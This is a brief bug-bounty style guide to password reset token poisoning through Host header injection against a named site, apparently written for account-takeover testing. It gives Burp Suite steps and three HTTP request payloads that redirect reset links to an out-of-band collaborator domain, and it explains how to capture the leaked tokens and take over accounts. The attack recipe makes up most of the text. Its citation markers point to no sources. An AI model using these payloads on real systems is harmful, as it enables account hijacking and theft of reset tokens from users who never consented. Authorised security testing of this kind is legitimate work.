## 1️⃣ Test Way 1: Password Reset Token Poisoning via Host Header
This aims to trick the backend server into generating a valid reset link but delivering it pointing to a server controlled by the attacker. [1, 2] 
## 📋 Step-by-Step Execution

   1. Navigate to the password reset page and input victim@h1.alias.
   2. Intercept the outbound request in Burp Suite Proxy and send it to Repeater.
   3. Modify the standard Host: header or inject secondary header layers to point to your Interactsh out-of-band domain (e.g., xyz.oast.pro).
   4. Send the request. [3] 

## 💉 Payloads (Header Modifications)

* Variant A (Direct Overwrite):

POST /api/password/reset HTTP/1.1
Host: xyz.oast.pro

* Variant B (X-Forwarded Headers):

POST /api/password/reset HTTP/1.1
Host: 1win.com
X-Forwarded-Host: xyz.oast.pro

* Variant C (Host Header Port Pollution):

POST /api/password/reset HTTP/1.1
Host: 1win.com:xyz.oast.pro


## 🔍 Response Verification Criteria

* Vulnerable Outcome ($1,500 Account Takeover): Check your Interactsh terminal client. If the target server sends an HTTP request containing a valid password reset token (e.g., GET /reset?token=12345), the server is vulnerable. Clicking that token allows an immediate account takeover. [4] 

